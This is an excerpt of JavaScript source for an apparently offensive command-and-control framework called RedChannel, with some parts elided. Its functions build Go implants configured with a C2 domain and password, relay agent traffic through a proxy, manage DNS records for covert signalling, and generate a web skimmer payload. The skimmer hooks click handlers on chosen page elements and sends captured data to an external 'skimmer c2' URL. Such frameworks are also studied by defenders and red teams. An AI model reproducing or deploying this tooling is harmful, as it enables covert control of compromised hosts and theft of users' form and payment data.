...
class RedChannel extends RedChannelObject {
        ...
        this.commands = {
            agent: {
                ...
                msg: {
                    params: ["<message>"],
                    desc:
                        "send an encrypted message to the agent, requires keyx",
                },
                shutdown: {
                    params: ["<agent id>"],
                    desc:
                        "shutdown the agent, confirm by entering the id, agent will not reconnect",
                },
                debug: {
                    params: [],
                ...
                "set proxy_url": {
                    params: ["<url>"],
                    desc:
                        "set the proxy url to use (http://proxy.domain.tld/proxy.php)",
            ...
            c2: {
                ...
                "use static_dns": {
                    params: [],
                    desc:
                        "use the static_dns module to add or remove static dns records",
                },
                "use implant": {
                    params: [],
            ...
            skimmer: {
                generate: {
                    params: [],
                    desc:
                        "generate skimmer payload with the specified url and target classes and ids",
                },
                "set url": {
                    params: ["<url>"],
                    desc:
                        "set the external skimmer c2 url (http://skimmer.url)",
                    validate_regex: VALID_URL_REGEX,
                },
                "set data_route": {
                    params: ["<route>"],
                ...
                "set target_classes": {
                    ...
                    desc:
                        "(optional) target classes with skimmer click handler, separated by comma",
                    validate_regex: VALID_CLASS_ID_REGEX,
                },
                "set target_ids": {
                    params: ["<id 1,id 2,id 3>"],
                    desc:
                        "(optional) target ids with skimmer click handler, separated by comma",
                    validate_regex: VALID_CLASS_ID_REGEX,
                },
            },
            proxy: {
    ...
    get_from_proxy() {
        ...
        if (
            typeof this.config.proxy.url !== "string" ||
        ...
        $request(options, (err, res, body) => {
            if (err) {
                if (this.config.debug)
                    this.log("error: proxy fetch failed: " + err);
                return;
            }
            ...
            if (body.length <= 5) {
                // console.log("* proxy response: " + body);
                if (this.config.debug)
                    this.log("error: proxy fetch response too small: " + body);
                return;
            }
            ...
            if (!VALID_PROXY_DATA.test(body)) {
                if (this.config.debug)
                    this.log(
                        "error: failed to validate incoming proxy data: " + body
                    );
                return;
            }
    ...
    make_ip_string(last_byte) {
        return (
            RECORD_HEADER_PREFIX +
            ":0000:" +
            this.AGENT_IGNORE.toString(16) +
            "01:0000:0000:dead:c0de:00" +
            last_byte
        );
    }
    ...
    skimmer_generate() {
        if (this.config.skimmer.url.length == 0) {
            return {
                message: "! skimmer url is required, see 'help'",
                error: true,
            };
        }
        ...
        var target_classes =
            "['" + this.config.skimmer.target_classes.join("','") + "']";
        var target_ids =
            "['" + this.config.skimmer.target_ids.join("','") + "']";
    ...
    proxy_generate() {
        if (this.config.proxy.key.length == 0) {
            return {
                message: "! proxy key is required, see 'help'",
                error: true,
            };
        }
    ...
    static_dns_add(params) {
        if (params.length < 2) {
            return {
                message: "! please enter a host and ip, see 'help'",
                error: true,
            };
        }
    ...
    implant_build_gen_config() {
        ...
        try {
            ...
            this.log(
                "error: failed to read agent config file template '" +
                    agent_config_path +
                    ".sample': " +
                    ex.toString()
            );
        ...
        config_data = config_data.replace(
            /^\s*c\.C2Domain\s*=\s*\".*\".*$/im,
            `c.C2Domain = "${this.config.c2.domain}"`
        );
        config_data = config_data.replace(
            /^\s*c\.C2Password\s*=\s*\".*\".*$/im,
            `c.C2Password = "${this.config.c2.plaintext_password}"`
        );
        config_data = config_data.replace(
            /^\s*c\.Resolver\s*=\s*\".*\".*$/im,
            `c.Resolver = "${this.config.implant.resolver}"`
        );
        config_data = config_data.replace(
            /^\s*c\.C2Interval\s*=.*$/im,
            `c.C2Interval = ${this.config.implant.interval}`
        );
        config_data = config_data.replace(
            /^\s*c\.ProxyEnabled\s*=.*$/im,
            `c.ProxyEnabled = ${this.config.proxy.enabled}`
        );
        config_data = config_data.replace(
            /^\s*c\.ProxyUrl\s*=\s*\".*\".*$/im,
            `c.ProxyUrl = "${this.config.proxy.url}"`
        );
        config_data = config_data.replace(
            /^\s*c\.ProxyKey\s*=\s*\".*\".*$/im,
            `c.ProxyKey = "${this.config.proxy.key}"`
        );
    ...
    implant_build(params) {
        ...
        if (!VALID_BUILD_TARGET_OS.test(os)) {
            return {
                message: "! invalid os value, must be supported by Go (GOOS)",
                error: true,
            };
        }
        if (!VALID_BUILD_TARGET_ARCH.test(arch)) {
            return {
                message:
                    "! invalid arch value, must be supported by Go (GOARCH)",
                error: true,
            };
        }
        ...
        try {
            ...
            return {
                message:
                    "! failed to launch build command: '" +
                    ex.toString() +
                    "', build command: '" +
                    binary +
                    " " +
        ...
        try {
            var log_stream = $fs.createWriteStream(
                root_folder + "/agent/build/build.log",
                { flags: "w" }
            );
            ...
            return {
                message: "! failed to write log file: " + ex.toString(),
                error: true,
            };
        }
        ...
        return {
            message: `* building ${
                debug ? "(debug)" : ""
            } agent for os: ${os}, arch: ${arch}, binary will be available here: ${output_file} and ${binary_url}`,
            error: false,
        };
    }
    implant_log() {
